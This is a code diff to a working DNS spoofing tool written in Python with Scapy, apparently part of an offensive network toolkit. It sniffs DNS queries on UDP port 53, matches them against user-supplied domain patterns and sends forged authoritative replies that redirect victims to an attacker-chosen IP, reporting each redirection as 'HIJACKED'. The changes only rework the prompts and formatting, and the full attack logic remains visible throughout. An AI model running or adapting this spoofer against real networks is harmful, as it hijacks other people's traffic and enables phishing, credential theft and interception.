@@ -3,10 +3,11 @@ import os
 import socket
 import sys
 import logging
+import questionary
 from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
 from rich.console import Console
 from rich.table import Table
-from core.ui import show_briefing
+from core.ui import show_briefing, Q_STYLE
 
 # Suppress Scapy runtime warnings
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -14,6 +15,7 @@ console = Console()
 
 # Configuration Dictionary
 SPOOF_MAP = {}
+
 
 def get_local_ip():
     """Retrieves the primary local IP address for default redirection."""
@@ -28,6 +30,7 @@ def get_local_ip():
         s.close()
     return ip
 
+
 def dns_callback(packet):
     """
     Analyzes DNS queries and injects spoofed responses.
@@ -36,36 +39,38 @@ def dns_callback(packet):
     # Check if the packet is a DNS Query (QR=0)
     if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
         qname = packet[DNSQR].qname.decode().strip('.')
-        
+
         # Check query name against our regex patterns
         for pattern, redirect_ip in SPOOF_MAP.items():
             try:
                 if re.search(pattern, qname, re.IGNORECASE):
                     # Construct the DNS response
-                    # qr=1: Response, aa=1: Authoritative, rd=packet[DNS].rd: Keep recursion desired flag
                     spoofed_pkt = (
                         IP(dst=packet[IP].src, src=packet[IP].dst) /
                         UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                         DNS(
                             id=packet[DNS].id,
-                            qr=1, 
-                            aa=1, 
+                            qr=1,
+                            aa=1,
                             qd=packet[DNS].qd,
                             an=DNSRR(
-                                rrname=packet[DNSQR].qname, 
-                                ttl=10, 
+                                rrname=packet[DNSQR].qname,
+                                ttl=10,
                                 rdata=redirect_ip,
-                                type="A" # Default to 'A' record
+                                type="A"  # Default to 'A' record
                             )
                         )
                     )
-                    
+
                     # Send packet immediately. 'count=1' ensures minimal overhead.
-                    send(spoofed_pkt, verbose=False, count=2) 
-                    console.print(f"[bold red][!] HIJACKED:[/bold red] {qname} redirected to {redirect_ip}")
-                    break # Pattern found, stop checking others
+                    send(spoofed_pkt, verbose=False, count=2)
+                    console.print(
+                        f"[bold red][!] HIJACKED:[/bold red] {qname} redirected to {redirect_ip}")
+                    break  # Pattern found, stop checking others
             except Exception as e:
-                console.print(f"[dim red][!] Error processing query: {e}[/dim red]")
+                console.print(
+                    f"[dim red][!] Error processing query: {e}[/dim red]")
+
 
 def start_dns_spoof():
     """Main execution loop for the DNS Spoofer."""
@@ -77,26 +82,26 @@ def start_dns_spoof():
         "Redirects traffic by forging DNS responses.",
         ["Requires MITM for external targets", "Beats real DNS responses by speed"]
     )
-    
+
     local_ip = get_local_ip()
     console.print(f"[dim grey]Auto-detected Local IP: {local_ip}[/dim grey]\n")
 
     # Rule Configuration UI
     while True:
-        pattern = console.input(
-            "[bold cyan]Domain Pattern (Regex, e.g., '.*google.*') or 'done': [/bold cyan]"
-        ).strip()
-        
-        if pattern.lower() == 'done':
-            break
-        
-        if not pattern:
-            continue
+        pattern = questionary.text(
+            "Domain Regex (e.g. .*google.*) [Empty to finish]:",
+            style=Q_STYLE
+        ).ask()
 
-        ip = console.input(f"Redirect [bold yellow]{pattern}[/bold yellow] to [Default {local_ip}]: ").strip()
-        if not ip:
-            ip = local_ip
-            
+        if not pattern:
+            break
+
+        ip = questionary.text(
+            f"Redirect IP for '{pattern}' (Default: {local_ip}):",
+            default=local_ip,
+            style=Q_STYLE
+        ).ask()
+
         # Basic IP validation
         try:
             socket.inet_aton(ip)
@@ -113,19 +118,23 @@ def start_dns_spoof():
             table.add_row(p, r)
         console.print(table)
 
-        console.print("\n[bold green][*] DNS Sniffer Active. Listening on UDP 53...[/bold green]")
-        console.print("[dim]Press Ctrl+C to safely terminate the spoofer.[/dim]\n")
-        
+        console.print(
+            "\n[bold green][*] DNS Sniffer Active. Listening on UDP 53...[/bold green]")
+        console.print(
+            "[dim]Press Ctrl+C to safely terminate the spoofer.[/dim]\n")
+
         try:
             # Filter for UDP port 53 (DNS)
             # store=0 prevents memory leaks during long-term sniffing
             sniff(filter="udp port 53", prn=dns_callback, store=0)
         except KeyboardInterrupt:
-            console.print("\n[yellow][-] Shutting down DNS Spoofer...[/yellow]")
+            console.print(
+                "\n[yellow][-] Shutting down DNS Spoofer...[/yellow]")
         except Exception as e:
             console.print(f"[bold red][!] Sniffer Error: {e}[/bold red]")
     else:
         console.print("[yellow][!] No rules defined. Exiting.[/yellow]")
+
 
 if __name__ == "__main__":
     start_dns_spoof()
